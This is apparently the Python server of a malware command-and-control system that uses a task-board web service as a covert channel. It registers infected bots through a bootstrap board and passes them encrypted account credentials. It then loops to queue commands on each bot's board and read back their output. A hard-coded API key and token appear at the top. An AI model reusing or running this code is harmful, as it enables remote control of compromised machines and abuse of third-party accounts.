import api_utils as utils
import time
import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

BOOTSTRAP_KEY = '1e3b5351487a6af8314ecf2547fb7ce5'
BOOTSTRAP_TOKEN = 'ATTA7f6aa6cfecd14a8a7e81d990d37a15ea9dc35a8838d58e9b6b26f17fc1e8a96460BB1D97'
NEW_CREDS_FILE = "new_creds.json"
USED_CREDS_FILE = "used_creds.json"
COMMANDS_FILE = "commands.json"
available_bots_credential = []
used_bots_credentials = []

malware_ids_used = []
executing_command_ids_per_bot = {}
finished_command_ids_per_bot = {}
commands = {}


def initialize_new_bot(bot_bootstrap_list_id, bot_id):
    # get new credentials if available
    if len(available_bots_credentials) == 0:
        print("ERROR: no more credentials available")
        return
    new_key = available_bots_credentials[0]['key']
    new_token = available_bots_credentials[0]['token']
    # delete previous boards on this account (cleanup)
    boards = utils.get_all_boards(new_key, new_token)
    for board in boards:
        if utils.delete_board(new_key, new_token, board['id']) < 0:
            print("ERROR: could not delete board. key: " +
                  new_key + ". id: " + board['id'])

    # create new board and list on the new account
    if utils.create_board(new_key, new_token, utils.BOT_BOARD_NAME + bot_id) < 0:
        print("ERROR: could not create board")
        return

    # post the new credentials on the bootstrap board

    # create a list on the server bootstrap board
    list_name = utils.BOOTSTRAP_LIST_NAME_PREFIX + bot_id
    server_bootstrap_list_id = utils.create_list_and_get_id(
        BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, list_name, utils.SERVER_BOOTSTRAP_BOARD_ID)
    # In each credentials exchange, the server generates a new private key and a new public key.
    key = utils.exchange_keys(
        BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, server_bootstrap_list_id, bot_bootstrap_list_id)
    if key is None:
        print("ERROR: could not exchange keys")
        return
    new_creds = new_key + utils.KEY_TOKEN_SEPERATOR + new_token
    message = utils.encrypt(key, new_creds)
    if utils.create_card(BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, server_bootstrap_list_id, utils.CRED_ANS_CARD_NAME,
                         message) < 0:
        print("ERROR: could not post credentials on bootstrap board")
        return

    # update the used credentials
    used_bots_credentials.append(available_bots_credentials[0])
    available_bots_credentials.pop(0)
    executing_command_ids_per_bot[bot_id] = []
    finished_command_ids_per_bot[bot_id] = []


def check_bootstrap_board():
    lists = utils.get_lists_in_board(
        BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, utils.BOT_BOOTSTRAP_BOARD_ID)

    for list in lists:
        name = list['name']
        malware_id = name.split(utils.BOOTSTRAP_LIST_NAME_PREFIX)[1]
        if malware_id in malware_ids_used:
            continue
        malware_ids_used.append(malware_id)
        cards = utils.get_cards_in_list(
            BOOTSTRAP_KEY, BOOTSTRAP_TOKEN, list['id'])
        if len(cards) == 0:
            print(
                "ERROR: no cards in bootstrap list. Maybe it will be created later. list id: " + list['id'])
            continue
        for card in cards:
            # received an account request
            if card['name'] == utils.CRED_REQ_CARD_NAME:
                initialize_new_bot(list['id'], malware_id)
                break


def check_bots_boards():
    global executing_command_ids_per_bot
    global finished_command_ids_per_bot
    for cred in used_bots_credentials:
        key = cred['key']
        token = cred['token']

        # assume one board and list per bot
        boards = utils.get_all_boards(key, token)
        if len(boards) == 0:
            print("ERROR: no boards for bot with key: " + key)
            continue
        if len(boards) > 1:
            print("ERROR: more than one board for bot with key: " + key)
            continue
        board_id = boards[0]['id']
        board_name = boards[0]['name']
        if not board_name.startswith(utils.BOT_BOARD_NAME):
            print("ERROR: board name is not as expected. name: " + board_name)
            continue
        bot_id = board_name.split(utils.BOT_BOARD_NAME)[1]
        if bot_id not in malware_ids_used or \
                bot_id not in executing_command_ids_per_bot or \
                bot_id not in finished_command_ids_per_bot:
            print(
                "ERROR: bot is unknown or wasn't initialized properly. bot id: " + bot_id)
            continue

        todo_list_id = utils.get_list_id(
            key, token, utils.TODO_LIST_NAME, board_id)
        done_list_id = utils.get_list_id(
            key, token, utils.DONE_LIST_NAME, board_id)
        if not todo_list_id or not done_list_id:
            print("ERROR: could not find TODO or DONE list id for bot with key: " + key)
            continue

        cards = utils.get_cards_in_list(key, token, done_list_id)
        executing_commands = executing_command_ids_per_bot[bot_id]
        finished_commands = finished_command_ids_per_bot[bot_id]
        for card in cards:
            if card['name'].endswith(utils.COMMAND_RESP_NAME):
                command_id = card['name'].split(
                    utils.COMMAND_TOKEN_SEPERATOR)[0]
                if command_id in executing_commands:
                    resp = card['desc']
                    print("Got response from bot id: " + bot_id +
                          " for command id: " + command_id + " response: " + resp)
                    executing_commands.remove(command_id)
                    finished_commands.append(command_id)
                elif command_id in finished_commands:
                    continue
                else:
                    print(
                        "ERROR: received response for command that was not sent, bot_id: " + bot_id
                        + " id: " + command_id)
                    continue
        if len(executing_commands) == 0:
            # ready to send new commands
            for command_id in commands:
                if command_id in finished_commands:
                    continue
                if utils.create_card(key, token, todo_list_id,
                                     str(command_id) + utils.COMMAND_TOKEN_SEPERATOR +
                                     utils.COMMAND_REQ_NAME, commands[command_id]) < 0:
                    print("ERROR: could not send command to bot id: " + bot_id)
                    break
                executing_commands.append(command_id)
                break
        executing_command_ids_per_bot[bot_id] = executing_commands
        finished_command_ids_per_bot[bot_id] = finished_commands


def update_creds():
    # read available
    global available_bots_credentials
    global used_bots_credentials
    available_bots_credentials = json.loads(
        open(NEW_CREDS_FILE).read())["creds"]
    # update used
    old_used_bots_credentials = json.loads(
        open(USED_CREDS_FILE).read())["creds"]
    used_bots_credentials = utils.add_lists(
        used_bots_credentials, old_used_bots_credentials)
    # print( used_bots_credentials)
    json_object = json.dumps({"creds": used_bots_credentials}, indent=4)
    with open(USED_CREDS_FILE, "w") as outfile:
        outfile.write(json_object)
    # subtract used from available
    available_bots_credentials = utils.subtract_lists(
        available_bots_credentials, used_bots_credentials)


def update_commands():
    global commands
    commands = json.loads(open(COMMANDS_FILE).read())["commands"]


def main():
    while True:
        update_creds()
        update_commands()
        check_bootstrap_board()
        check_bots_boards()
        time.sleep(10)


if __name__ == '__main__':
    main()
